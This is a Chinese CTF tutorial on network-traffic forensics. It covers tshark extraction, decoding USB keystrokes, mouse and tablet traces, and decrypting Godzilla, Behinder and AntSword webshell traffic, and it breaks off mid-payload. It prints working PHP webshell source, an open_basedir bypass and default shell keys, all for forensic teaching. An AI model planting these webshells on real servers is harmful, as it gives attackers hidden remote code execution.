# Misc-流量分析


**CTF-Misc 入门指南——流量分析系列** 

<!--more-->
拿到流量包后，第一件事就是可以先 `strings | grep flag{` 一下，说不定 flag 就直接出了

当然也可以使用`@凤二西`师傅的 `破空_flag查找工具3.5.exe` 来搜索 flag

## WireShark基础

刚刚接触流量分析的同学，看到`Wireshark`中密密麻麻的流量包和字段可能会感觉无从下手

但是其实我们要明白一点就是，流量分析的第一步就是过滤，把流量包过滤到我们能掌控的范围内，然后再逐个分析

`wireshark`的过滤器其实上手很简单，用熟悉了以后会给人一种非常顺手的感觉

常见的协议比如`http`，常用的有下面这些参数，其实只要在过滤器中输入`htt`. 它就会自动提示你后面的字段了

```
http.request.method == "POST"
http.request.full_uri == “XXX”
......
```

除了协议以外，还有一些比较常用的

```bash
# 包含什么内容的帧
frame contains "XXX"
```

其实这里可以直接右击想要过滤的字段，然后作为过滤器选中，上面就会自己跳出来过滤的表达式了（这里也可以使用或选中和且选中）

有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了

![](imgs/N1.png)

## tshark使用教程

导出流量包中所有POST数据包的data数据

```bash
tshark -r 1.pcapng -Y "http.request.method == POST" -T fields -e data.data > data.txt
# -r：指定了需要读取的文件
# -Y：使用过滤器
# -T：表示仅仅输出所选字段
# -e：指定提取的字段
```

以下两个命令是Linux中的命令
```bash
# uinq：去除重复行
# sed '/^\s*$/d'：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）
```

在我们清楚了tshark的相关命令后，我们就可以尝试编写Python脚本来调用tshark进行流量包的处理了

这种用法通常在我们分析较大流量包并且需要频繁复制里面的数据的时候比较实用

```python
import json
import subprocess

output = ""
file_path = "" # 流量包的路径
command = [
	"tshark",  # tshark的路径，如果在环境变量里这里就不用改
	'-r', file_path,  # 读取指定的 pcapng 文件
	'-Y', 'http',  # 过滤出 HTTP 数据包
	'-T', 'json',  # 输出为 JSON 格式
	'-e', 'http.request.method',  # 请求方法
	'-e', 'http.host',  # 请求主机
	'-e', 'http.request.uri',  # 请求 URI
	'-e', 'http.user_agent',  # 用户代理
	'-e', 'http.file_data',  # 请求中的文件数据（POST 请求的内容）
	'-e', 'http.response.code',  # 响应代码
	'-e', 'http.response.phrase',  # 响应短语
	'-e', 'http.content_type'  # 响应内容类型
]
result = subprocess.run(
    command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
json_output = json.loads(result.stdout)
# print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除

# 遍历 JSON 数据并提取字段
for packet in json_output:
    layers = packet.get('_source', {}).get('layers', {})
    request_method = layers.get('http.request.method', ['None'])[0]
    request_host = layers.get('http.host', ['None'])[0]
    request_uri = layers.get('http.request.uri', ['None'])[0]
    user_agent = layers.get('http.user_agent', ['None'])[0]
    file_data = layers.get('http.file_data', ['None'])[0]
    response_code = layers.get('http.response.code', ['None'])[0]
    response_phrase = layers.get('http.response.phrase', ['None'])[0]
    content_type = layers.get('http.content_type', ['None'])[0]
```

## 流量分析基础考点

### 1、直接搜索flag明文或者编码过的flag:

### 2、流量包端口隐写（可能会有01互换）

### 3、TCP/FTP协议传输文件(binwalk和foremost都没用)：

```
1. 直接用wireshark导出为pcap文件然后用networkminer分析
2. 拉入kali用tcpxtract提取文件：tcpxtract -f +文件名.pcap
3. 直接追踪流提取16进制，根据文件头尾提取出文件
```

### 4、有时候可能需要根据IP或者版本分类导出

## USB流量分析

常见的类型有鼠标流量和键盘流量，当然有时候还会出现数位板这种设备的流量

流量包中数据存储的字段有两种：`usb.capdata` 和 `usbhid.data`

### 键盘流量分析

> 键盘流量的数据常见的长度为8字节

首先根据数据存储的字段，用`tshark`提取出数据，注意在有多个IP的情况下要用过滤器分IP提取

```bash
tshark -r example.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' > data.txt
tshark -r example.pcapng -T fields -e usbhid.data | sed '/^\s*$/d' > data.txt

tshark -r example.pcapng -Y 'usb.src == "2.3.1"' -T fields -e usbhid.data | sed '/^\s*$/d' > data.txt
# -r：指定了需要读取的文件
# -Y：使用过滤器
# -T：表示仅仅输出所选字段
# -e：指定提取的字段
# sed '/^\s*$/d'：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）
```

然后使用脚本根据对照表还原出键盘输入的数据即可

> Tips:网上的教程都是告诉大家需要对数据先添加冒号，但是现在新版的tshark很多情况下提取出来的数据是不带冒号的
> 
> 因此我个人觉得这里没必要多此一举，我们还是要与时俱进，简单改一下网上的脚本就行
> 
> 这里就贴一份的自己写的还原脚本吧

```python
normalKeys = {"04": "a", "05": "b", "06": "c", "07": "d", "08": "e", "09": "f", "0a": "g", "0b": "h", "0c": "i",
              "0d": "j", "0e": "k", "0f": "l", "10": "m", "11": "n", "12": "o", "13": "p", "14": "q", "15": "r",
              "16": "s", "17": "t", "18": "u", "19": "v", "1a": "w", "1b": "x", "1c": "y", "1d": "z", "1e": "1",
              "1f": "2", "20": "3", "21": "4", "22": "5", "23": "6", "24": "7", "25": "8", "26": "9", "27": "0",
              "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t", "2c": "<SPACE>", "2d": "-", "2e": "=", "2f": "[",
              "30": "]", "31": "\\", "32": "<NON>", "33": ";", "34": "'", "35": "<GA>", "36": ",", "37": ".", "38": "/",
              "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",
              "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}

shiftKeys = {"04": "A", "05": "B", "06": "C", "07": "D", "08": "E", "09": "F","0a": "G", "0b": "H", "0c": "I", 
             "0d": "J", "0e": "K", "0f": "L", "10": "M", "11": "N", "12": "O","13": "P", "14": "Q", "15": "R",
             "16": "S", "17": "T", "18": "U", "19": "V", "1a": "W", "1b": "X","1c": "Y", "1d": "Z", "1e": "!",
             "1f": "@", "20": "#", "21": "$", "22": "%", "23": "^", "24": "&","25": "*", "26": "(", "27": ")",
             "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t", "2c": "< SPACE > ", "2d": "_", "2e": " + ",
             "2f": "{", "30": "}", "31": "|", "32": "<NON>", "33": "\"", "34": ":", "35":"<TILDE>", "36": "<", 
             "37": ">", "38": "?","39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "< F4 > ", 
             "3e": " < F5 > ","3f": " < F6 > ","40": "<F7>","41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "< F11 > ", "45": " < F12 > "}
output = []
delete_output = []
keys = open('data.txt')
for line in keys:
    try:
        if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[2]!='0' or line[3]!='0' or line[6]!='0' or line[7]!='0' or line[8]!='0' or line[9]!='0' or line[10]!='0' or line[11]!='0' or line[12]!='0' or line[13]!='0' or line[14]!='0' or line[15]!='0' or line[4:6]=="00":
             continue
        if line[4:6] in normalKeys.keys():
            if line[1] == '2':
                output += [shiftKeys[line[4:6]]]
            else:
                output += [normalKeys[line[4:6]]]
        else:
            output += ['[unknown]']
    except:
        pass
keys.close()

flag=0
for i in range(len(output)):
    try:
        if output[i] == "<CAP>":
            flag = 1 - flag
        if flag != 0:
            output[i] = output[i].upper()
    except:
        pass

output = [x for x in output if x != '<CAP>']

new_output = []
for i in range(len(output)):
    if output[i] == "<DEL>":
        delete_output.append(output[i-1])
        new_output = new_output[:-1]
    else:
        new_output.append(output[i])
        
print(f'[+] 键盘输入的内容为：{"".join(output)}')
print(f'[+] 键盘删除的内容为：{"".join(delete_output)}')
print(f'[+] 最后的结果为：{"".join(new_output)}')
```

然后有时候还会出现这样一种考点就是：出题人会把关键信息藏在被`<DEL>`的字符中

因此我们需要把被删除的字符也还原出来


### 鼠标流量

> 键盘流量的数据常见的长度为4字节、6字节、7字节、8字节

和键盘流量的过程一样，第一步都是先用tshark提取出数据

```bash
tshark -r example.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' > data.txt
tshark -r example.pcapng -T fields -e usbhid.data | sed '/^\s*$/d' > data.txt

tshark -r example.pcapng -Y 'usb.src == "2.3.1"' -T fields -e usbhid.data | sed '/^\s*$/d' > data.txt
# -r：指定了需要读取的文件
# -Y：使用过滤器
# -T：表示仅仅输出所选字段
# -e：指定提取的字段
# sed '/^\s*$/d'：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）
```

然后和网上那些教程不同，我这里就自己改了一下脚本，就不用多此一举给数据添加冒号了

```python
import matplotlib.pyplot as plt
import numpy as np  

def get_XY():
    out = ""
    posx = 0
    posy = 0
    with open("data.txt",'r') as f:
        data = f.read().split()
        for line in data:
            if len(line) == 8:
                flag = int(line[0:2],16) # 1-左键 2-右键 0-nothing
                x = int(line[2:4],16)
                y = int(line[4:6],16)
            elif len(line) == 12:
                flag = int(line[2:4],16) # 1-左键 2-右键 0-nothing
                x = int(line[4:6],16)
                y = int(line[6:8],16)
            elif len(line) == 14:
                flag = int(line[2:4],16) # 1-左键 2-右键 0-nothing
                x = int(line[4:6],16)
                y = int(line[6:8],16)
            elif len(line) == 16:
                flag = int(line[2:4],16) # 1-左键 2-右键 0-nothing
                x = int(line[4:6],16)
                y = int(line[8:10],16)
            
            # 鼠标的移动数据通常是以有符号8位整数的形式存储的，范围是 -128 到 127
            if x > 127:
                x -= 256
            if y > 127:
                y -= 256
            # 累加距离，算出鼠标当前所在的位置
            posx += x
            posy += y
            # 查看鼠标左键/右键/nothing的轨迹
            # if flag == 0:
            # if flag == 1:
            if flag == 2:
                out += str(posx) + ' ' + str(posy) + '\n'
    with open("xy.txt","w") as f:
        f.write(out)

def plot():
    # unpack=True将每列数据分别存储到一个数组中
    x,y = np.loadtxt("xy.txt",delimiter=' ',unpack=True)
    plt.plot(x, -y, '.')
    plt.show()
    
if __name__ == "__main__":
    get_XY()
    plot()
```


### 数位板流量分析：

[例题1-2022浙江省赛决赛-hard_Digital_plate](https://goodlunatic.github.io/posts/3f7db4e/#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-hard_digital_plate)

例题2-RoarCTF MISC Davinci_Cipher

```bash
# 先导出数据并去除空行
tshark -r hard_Digital_plate.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' > out.txt
# -r 指定了需要读取的文件
# -T 表示仅仅输出所选字段
# -e 指定提取的字段
# 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）
```

类似于：

```
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08813708951e650000000000
08813808951ec10000000000
08813908951e2e0100000000
08813a08951e940100000000
08813b08951ee20100000000
08813c08951e1c0200000000
08813c08951e440200000000
08813c08951e610200000000
```

需要我们根据设备的传输协议来分析出对应的xy坐标以及压感数据

```python
import matplotlib.pyplot as plt

with open("data.txt","r") as f:
    lines = f.read().split()
    
def draw_pic1():
    x = []
    y = []
    for line in lines:
        if(int(line[12:16],16) != 0):
            x.append(int(line[6:8],16) << 8 | int(line[4:6],16))
            y.append(-1 * (int(line[10:12],16) << 8 | int(line[8:10],16)))
    
    plt.plot(x,y,'.')
    plt.show()

def draw_pic2():
    x = []
    y = []
    press_lst = []
    for line in lines:
        if(int(line[12:16],16) != 0):
            press_data = int(line[12:16],16)
            press_lst.append(press_data)
            if(press_data < 65000):
                x.append(int(line[6:8],16) << 8 | int(line[4:6],16))
                y.append(-1 * (int(line[10:12],16) << 8 | int(line[8:10],16)))
            
    plt.plot(x,y,'.')
    plt.show()

if __name__ == "__main__":
    draw_pic1()
    # draw_pic2()
```

## SQL注入流量分析

可以使用 wireshark 的过滤器过滤出注入的流量，然后导出特定分组

然后使用 tshark 根据字段名提取出所有的注入语句

如果是盲注的话，直接写个正则匹配脚本提取数据即可

例题1-2023 铁三 traffic

## Webshell流量分析

Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzip的文件头是`1F 8B 08 00`

### 菜刀流量分析

菜刀流量的一个明显的特征就是，响应里可能有 `->|      |<-` 这样的字符串

![](imgs/image-20250419164405745.png)

流量分析和解密上没啥难度，一般就是简单的明文流量或者就Base64编码了一下

### 哥斯拉流量分析

考链接：[https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/](https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/)

> 哥斯拉的默认密钥为：3c6e0b8a9c15224a

哥斯拉流量一般的加密方式就是异或，当然在插件的加持下可能也会用到AES

我们以下面这个编码器为例子，这里要注意异或的时候，是从密钥的第二位开始异或

因此当我们使用CyberChef解密的时候，需要把密钥的第一位移到最后

```php
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
```

一般简单的哥斯拉流量的题目，知道上面这个就能够解密了

当然，也会有题目会考察选手对哥斯拉细节的理解

因此我们就拿下面这个哥斯拉的Webshell为例子，深入分析一下哥斯拉流量的加密流程

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);

// 编码器
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}

$pass='babyshell'; // 哥斯拉的连接密码
$payloadName='payload';
$key='421eb7f1b8e4b3cf';// 哥斯拉流量的解密密钥

if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
    		eval($payload);
        echo substr(md5($pass.$key),0,16); // 输出MD5(连接密码+流量解密密钥)的前16位
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16); // 输出MD5(连接密码+流量解密密钥)的后16位
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
?>
```

仔细观察上面的Webshell源码，关键部分我已经写上了对应的注释

哥斯拉流量解密的关键就在于`$key`这个密钥上，假如这个密钥未知，我们有什么办法去得到它呢

第一种最简单方法就是看看流量中有没有上传Webshell的源码，如果有，可以从源码中获得

第二种方法是我们可以结合请求和响应包中的数据，尝试去爆破这个解密密钥

这种方法就考察了哥斯拉流量的加密流程，因此我们需要去逆向分析一下这个密钥是如何生成的

Github上有开源的逆向后的源码：[https://github.com/Freakboy/Godzilla](https://github.com/Freakboy/Godzilla)

其中，我们主要关注下面这段代码

```java
public byte[] generate(String password, String secretKey) {
    return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
}
```

我们可以发现，哥斯拉的流量解密密钥是明文密钥MD5的前十六位，而这个明文密钥一般是可读的字符串

然后结合响应包中，会输出输出MD5(连接密码+流量解密密钥)的值

```php
eval($payload);
echo substr(md5($pass.$key),0,16); // 输出MD5(连接密码+流量解密密钥)的前16位
echo base64_encode(encode(@run($data),$key));
echo substr(md5($pass.$key),16); // 输出MD5(连接密码+流量解密密钥)的后16位
```

因为连接密码可以从请求包中得到，就是请求包中POST传参的参数

因此，我们就可以尝试写一个脚本去爆破密钥

```python
import hashlib


def md5_encode(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

def crack_key(key_list,target_hash):
    pwd = "Antsword" # 哥斯拉的连接密码
    for key in key_list:
        tmp = md5_encode(key) # 明文密钥的MD5
        tmp_hash = md5_encode(pwd+tmp[:16]) # 响应中返回的hash
        if tmp_hash == target_hash:
            print(f"[+] 密钥爆破成功: {key}")
            print(f"[+] 用于解密哥斯拉流量的密钥为 {tmp[:16]}")
    return key

if __name__ == '__main__':
    # 响应中返回的hash
    target_hash = "e71f50e9773b23f9792dea3a7ae385ca"
    with open("dic.txt",'r') as f:
        key_list = f.read().split()
    crack_key(key_list, target_hash)

# [+] 密钥爆破成功: Antsw0rd
# [+] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e
```

当然也可以直接用CTF-NetA爆破

![](imgs/image-20250515121809838.png)

例题1-2024福建省数据安全大赛-gza_Cracker

例题2-2020HITCTF-Traffic

附：哥斯拉密钥爆破+流量批量解密脚本

```python
import re
import io
import gzip
import json
import base64
import hashlib
import subprocess
import urllib.parse


def url_decode(encoded_str):
    return urllib.parse.unquote(encoded_str)

def xor_decode(data: bytes, key: bytes) -> bytes:
    result = bytearray()
    for i in range(len(data)):
        c = key[(i + 1) & 15]
        result.append(data[i] ^ c)
    return bytes(result)

def gunzip_bytes(compressed_data: bytes) -> bytes:
    with gzip.GzipFile(fileobj=io.BytesIO(compressed_data)) as f:
        return f.read()

def decrypt_traffic(filename,key):
    http_data = []
    command = [
        "tshark",  # tshark的路径，如果在环境变量里这里就不用改
        '-r', filename,  # 读取指定的 pcapng 文件
        '-Y', 'http',  # 过滤出 HTTP 数据包
        '-T', 'json',  # 输出为 JSON 格式
        '-e', 'http.file_data',  # 请求中的文件数据（POST 请求的内容）
        '-e', 'http.response.phrase',  # 响应短语
        '-e', 'http.content_type'  # 响应内容类型
    ]
    result = subprocess.run(
        command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    json_output = json.loads(result.stdout)
    # print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除

    # 遍历 JSON 数据并提取字段
    for packet in json_output:
        layers = packet.get('_source', {}).get('layers', {})
        request_method = layers.get('http.request.method', ['None'])[0]
        response_code = layers.get('http.response.code', ['None'])[0]
        file_data = layers.get('http.file_data', ['None'])[0]
        try:
            http_data.append(url_decode(bytes.fromhex(file_data).decode('utf-8')))
        except:
            pass
    for item in http_data:
        # print(item)
        if "Antsword=" in item:
            try:
                enc = re.findall(r"Antsword=(.*)",item)[0]
                # print(enc)
                dec = xor_decode(base64.b64decode(enc),key.encode('utf-8'))
                dec = gunzip_bytes(dec).decode('utf-8',errors='ignore')
                print(f"[+] 请求: {dec}")
            except:
                pass
        if "e71f50e9773b23f9" in item:
            try:
                enc = re.findall(r"e71f50e9773b23f9(.*)792dea3a7ae385ca",item)[0]
                dec = xor_decode(base64.b64decode(enc),key.encode('utf-8'))
                dec = gunzip_bytes(dec).decode('utf-8',errors='ignore')
                print(f"[+] 响应: {dec}")
            except:
                pass

def md5_encode(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

def crack_key(key_list,target_hash):
    pwd = "Antsword" # 哥斯拉的连接密码
    for key in key_list:
        tmp = md5_encode(key) # 明文密钥的MD5
        tmp_hash = md5_encode(pwd+tmp[:16]) # 响应中返回的hash
        if tmp_hash == target_hash:
            print(f"[+] 密钥爆破成功: {key}")
            print(f"[+] 用于解密哥斯拉流量的密钥为 {tmp[:16]}")
    return key

if __name__ == '__main__':
    # 响应中返回的hash
    # target_hash = "e71f50e9773b23f9792dea3a7ae385ca"
    # with open("dic.txt",'r') as f:
        # key_list = f.read().split()
    # crack_key(key_list, target_hash)
    # [+] 密钥爆破成功: Antsw0rd
    # [+] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e
    decrypt_traffic('Crack_me.pcap','a18551e65c48f51e')
```

#### php_xor_raw

传输的数据类似于下图这种

![](imgs/image-20250226141615204.png)

因此我们直接对照着加密逻辑，CyberChef解密请求和响应即可（当然这里也可以写个脚本批量解）

![](imgs/image-20250226141953586.png)


![](imgs/image-20250226142116762.png)

#### php_xor_base64

![](imgs/image-20250226142501601.png)

加密逻辑和上面的一样，就是多了一个URL解码和Base64解码的过程

![](imgs/image-20250226142239379.png)

然后响应的数据头尾会输出`md5(pass.key)`的前十六位和后十六位，解密的时候删去即可

```php
echo substr(md5($pass.$key),0,16);
echo base64_encode(encode(@run($data),$key));
echo substr(md5($pass.$key),16);
```

![](imgs/image-20250226142441765.png)

#### php_eval_xor_base64

![](imgs/image-20250226142732540.png)

这种情况下前面的数据`URL解码+reverse+Base64解码`后可以得到加密的key

然后执行的命令在第二个参数中，就是上图中的`babyshell`

剩下的步骤就和之前一样了

![](imgs/image-20250226143409529.png)

![](imgs/image-20250226143429376.png)

### 冰蝎流量分析

> 冰蝎的默认密钥为：e45e329feb5d925b（md5(rebeyond)的前16位）
> 
> ！！当找不到密钥或者密钥未知的时候可以尝试直接用默认密钥解密试一下！！

或者也可以尝试用`PuzzleSolver`爆破一下密钥

![](imgs/image-20250424172707884.png)

冰蝎流量的加密方式主要包括异或和AES，异或加密的话是和哥斯拉一样的

具体的加密代码如下所示：

```php
<?php
@error_reporting(0);
session_start();
	// $key="e45e329feb5d925b"; // 默认密钥
    $key="5b4582c9d56b5b33";
	$_SESSION['k']=$key;
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

> 大体功能是：POST接收加密数据，随后先进行Base64解码，再判断是否启用OpenSSL扩展，如果启用则使用AES解密，如果没有则使用密钥循环异或解密。Webshell在上传后，会先生成一段代码用于处理执行结果并加密返回给客户端，确保响应流量中的数据也是加密的，随后开始执行攻击者的命令，如果是PHP Webshell，在冰蝎客户端中点开该shell的时候会自动执行一次phpinfo，以上过程在流量中均有体现。


#### XOR_base64

异或的情况和哥斯拉的有点像，把密钥的第一位放到最后一位然后解密即可

![](imgs/image-20250419164124175.png)

#### AES_base64

当加密器用的是AES加密的时候就需要注意了

可能会有两种情况，一种是AES-ECB（没有IV），一种是AES-CBC（有IV）

如果是 AES-ECB，那直接用填入密钥解密即可，这里我们详细讨论一下 AES-CBC 的情况

> 这里仅讨论默认PHP Webshell的情况，不同语言或不同Shell情况不同，需分情况对待

冰蝎4.0的默认IV是：`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`

首先，需要分析那段PHP Webshell中的一句：`$post=openssl_decrypt($post, "AES128", $key);`

该Shell通过OpenSSL扩展实现AES加解密，而OpenSSL中的AES128通常默认对应AES-128-CBC，而上文那句话里并没有传入IV参数，所以OpenSSL会把所需的IV处理为默认值，也就是全0（16个\x00）

如果在WebShell中传了自定义的IV参数，那么解密时需要将该IV填入，比如：`0123456789abcdef`

照常理来说使用这样默认为16个`\x00`的IV即可正常解密。但传入16个1也可以正常解出`base64_decode()`括号内的内容，如下图所示：

![](imgs/f4413f003bad201ef52b84974e4a5bdb.png)

这要说到AES-CBC的原理：

![](imgs/040733479f1ea54a0871282953df365a.png)

每一个密文块（16位）解密后都要和前一个密文块按位异或，而第一个密文块前没有密文块，所以需要16位的IV来“充当密文块”，而IV的错误只会影响第一个密文块的内容，后面的密文块能否正常解密只和前一个密文块有关。`base64_decode()`括号内的内容并不在第一个密文块里，所以看上去变成了“无论什么IV都可以正确解出密文”

虽然偏移是0（异或0等于没有异或，也就等于没有IV），但依然不能直接使用AES-ECB进行解密，因为相比起ECB，IV是0的CBC从第二个密文块开始依然有异或的过程，所以在Cyberchef里应使用如下参数解密：

```python
AES Decrypt #仅讨论默认情况
Key: e45e329feb5d925b (UTF-8)
IV： \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 (Hex)
Mode：CBC
Input / Output：Raw (视情况而定)
```

反正不管是哪种加密，都可以用CyberChef试一试，看看哪一种可以正常解出来就行

![](imgs/N3.png)

![](imgs/N4.png)

当然，这里如果想要偷懒，对于冰蝎和哥斯拉流量也可以用`@风二西`师傅的`承影_哥斯拉冰蝎解码工具`辅助解密

直接将木马中的密钥复制到工具中，然后 Ctrl+A 全选加密的数据，再右键选择对应的解密方式即可

![](imgs/N5.png)

最后，如果遇到数据量比较庞大的流量分析的时候，可能会需要用到脚本解密批量的情况

这里我就放几个比较简单的解密脚本

```python
# XOR
import base64
key = "e45e329feb5d925b"

def decrypt_xor(ciphertext_base64):
    ciphertext = base64.b64decode(ciphertext_base64)
    key_stream = (key[(i+1)%len(key)] for i in range(len(ciphertext)))
    decrypted = bytes([a ^ ord(b) for a, b in zip(ciphertext, key_stream)])
    return decrypted
```

```python
# AES-CBC
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

key = "5b4582c9d56b5b33"
key = key.encode('utf-8').ljust(16, b'\x00')  # 默认填充到16字节(AES-128)
iv = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

def decrypt_aes_cbc(ciphertext_base64):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = base64.b64decode(ciphertext_base64)
    decrypted = cipher.decrypt(ciphertext)
    return decrypted
```

### 蚁剑流量分析

蚁剑支持多种编码器，然后Github上也有很多[开源的编码器](https://goodlunatic.github.io/posts/5422d65/#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90)

1、 [https://github.com/lowliness9/AntSwordEncoder](https://github.com/lowliness9/AntSwordEncoder)

2、 [https://github.com/AntSwordProject/AwesomeEncoder](https://github.com/AntSwordProject/AwesomeEncoder)

因此流量的分析和解密上就会稍微复杂一点

这里我稍微写一下蚁剑流量分析需要注意的地方：

> 0、首先需要判断出攻击者用的是什么编码器
> 
> 1、路径base64字符串需要去除前两个字符后再解码
> 
> 2、响应数据的头尾有额外的字符，需要先去除然后再base64解码

```php
// 蚁剑webshell一个比较简单的例子
<?php
// 设置一些PHP配置
@ini_set("display_errors", "0"); // 关闭显示错误信息
@set_time_limit(0); // 设置脚本执行时间为无限制
// 获取open_basedir配置
$opdir = @ini_get("open_basedir");
// 如果open_basedir配置存在
if ($opdir) {
    // 获取当前脚本所在目录
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    // 将open_basedir路径分割成数组
    // /;|:/
    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
    // 将当前目录和系统临时目录添加到数组中
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    // 遍历open_basedir数组
    foreach ($oparr as $item) {
        // 如果目录不可写，继续下一个目录
        if (!@is_writable($item)) {
            continue;
        }
        // 创建一个临时目录
        $tmdir = $item . "/.573ef8c9dd12";
        @mkdir($tmdir);
        // 如果目录创建失败，继续下一个目录
        if (!@file_exists($tmdir)) {
            continue;
        }
        // 获取临时目录的真实路径
        $tmdir = realpath($tmdir);
        // 切换到临时目录
        @chdir($tmdir);
        // 修改open_basedir配置，使其可以访问上层目录
        @ini_set("open_basedir", "..");
        // 获取目录路径的数组
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        // 逐级返回上层目录，以还原open_basedir配置
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        }
        // 恢复open_basedir配置为根目录
        @ini_set("open_basedir", "/");
        // 删除临时目录
        @rmdir($tmdir);
        // 跳出循环，只操作第一个可写目录
        break;
    }
}
// 自定义函数，对输出进行base64编码
function asenc($out)
{
    return @base64_encode($out);
}
// 自定义函数，获取输出缓冲区内容并进行处理
function asoutput()
{
    $output = ob_get_contents(); // 获取输出缓冲区内容
    ob_end_clean(); // 清空输出缓冲区
    // 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
    echo "fb708664";
    echo @asenc($output);
    echo "870b983ed5";
}
// 开始输出缓冲区
ob_start();
try {
    // 解码POST请求中的文件路径和内容
    // 从这个变量的值中取出从第二个字符开始到最后的子字符串，蚁剑需要去除前两个字母的原因所在
    $f = base64_decode(substr($_POST["idb82191cedb24"], 2));
    $c = $_POST["e748c4dcd196bb"];
    $c = str_replace("\r", "", $c);
    $c = str_replace("\n", "", $c);
    $buf = "";
    // 将内容进行URL解码
    for ($i = 0; $i < strlen($c); $i += 2) {
        $buf .= urldecode("%" . substr($c, $i, 2));
    }
    // 将解码后的内容写入文件，并返回结果
    echo (@fwrite(fopen($f, "a"), $buf) ? "1" : "0");
} catch (Exception $e) {
    // 如果发生异常，输出错误信息
    echo "ERROR://" . $e->getMessage();
}
// 调用自定义函数处理输出
asoutput();
// 终止脚本执行
die();
?>
```

#### Reverse

#### ROT13

```php
<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
$opdir = @ini_get("open_basedir");
if ($opdir) {
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;
        };
        $tmdir = $item . "/.9315a2db7e5d";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {
            continue;
        }
        $tmdir = realpath($tmdir);
        @chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        };
        @ini_set("open_basedir", "/");
        @rmdir($tmdir);
        break;
    };
};;
function asenc($out)
{
    return str_rot13($out);
};
function asoutput()
{
    $output = ob_get_contents();
    ob_end_clean();
    echo "80" . "324";
    echo @asenc($output);
    echo "5a9" . "ae81";
}

ob_start();
try {
    $p = base64_decode(substr($_POST["nd940e9a247057"], 2));
    $s = base64_decode(substr($_POST["ca662241d33bb8"], 2));
    $envstr = @base64_decode(substr($_POST["uf4fe7e98c2272"], 2));
    $d = dirname($_SERVER["SCRIPT_FILENAME"]);
